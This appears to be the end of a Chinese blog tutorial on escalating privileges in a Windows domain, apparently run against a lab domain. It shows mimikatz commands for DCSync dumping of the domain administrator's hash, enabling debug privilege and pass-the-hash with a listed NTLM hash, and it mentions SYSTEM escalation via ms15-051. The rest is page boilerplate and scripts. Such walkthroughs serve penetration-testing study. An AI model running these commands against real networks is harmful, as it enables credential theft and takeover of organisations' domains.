+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214135723990.png" srcset="/img/loading.gif" lazyload alt="image-20240214135723990"></p>
+</li>
+<li><p>获取域控用户Hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz lsadump::dcsync /domain:mingy.local /dc:DC /user:administrator /authuser:DC$ /authdomain:mingy /authpassword:<span class="hljs-string">&quot;&quot;</span> /authntlm<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214145341876.png" srcset="/img/loading.gif" lazyload alt="image-20240214145341876"></p>
+</li>
+<li><p>得到域管权限</p>
+<p>利用域管理员Hash得到域管权限，执行如下命令后会打开一个具有域管理员权限的cmd.exe进程  </p>
+<p>获得SeDebugPrivilege权限  </p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> privilege::<span class="hljs-literal">debug</span>  <br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>  注意：因为当前beacon用户权限为域内普通用户 MINGY\bob，需要有管理员或者SYSTEM权限才能  获得 SeDebugPrivilege 权限，因此需要在提权操作后得到的beacon中执行本步骤操作，这里我们  通过ms15-051得到SYSTEM权限的beacon  </p>
+</blockquote>
+<p>hash注入</p>
+<blockquote>
+<p>  mimikatz sekurlsa::pth  &#x2F;user:administrator &#x2F;domain:mingy &#x2F;rc4:7e9067ca378134e50512ab894de75517</p>
+</blockquote>
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>域环境权限提升</div>
+      <div>https://tsy244.github.io/2024/02/14/渗透/域环境权限提升/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 14, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/14/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%9D%82%E8%AE%B0/" title="杂记">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">杂记</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/13/%E6%95%B4%E7%90%86/Shiro%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="Shiro漏洞整理">
+                        <span class="hidden-mobile">Shiro漏洞整理</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
